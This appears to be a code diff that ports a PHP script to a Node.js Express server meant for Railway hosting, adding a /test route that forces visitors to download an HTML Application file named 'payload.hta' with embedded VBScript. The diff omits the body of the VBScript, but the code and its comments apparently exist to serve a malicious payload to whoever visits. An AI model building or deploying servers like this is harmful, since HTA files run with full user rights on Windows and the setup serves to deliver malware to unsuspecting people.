@@ -1,8 +1,14 @@
-<?php
-header('Content-Type: application/hta');
-header('Content-Disposition: attachment; filename="payload.hta"');
+const express = require('express');
+const app = express();
 
-$hta = '
+// Your existing route (shows "hello")
+app.get('/', (req, res) => {
+    res.send('hello');
+});
+
+// The /test route that serves your .hta payload
+app.get('/test', (req, res) => {
+    const htaPayload = `
 <html>
 <body>
 <script language="VBScript">
@@ -21,8 +27,14 @@ End If
 window.close()
 </script>
 </body>
-</html>
-';
+</html>`;
 
-echo $hta;
-?>
+    // Force download as .hta file
+    res.setHeader('Content-Type', 'application/hta');
+    res.setHeader('Content-Disposition', 'attachment; filename="payload.hta"');
+    res.send(htaPayload);
+});
+
+// Railway uses PORT environment variable
+const port = process.env.PORT || 3000;
+app.listen(port, () => console.log(`Server running on port ${port}`));
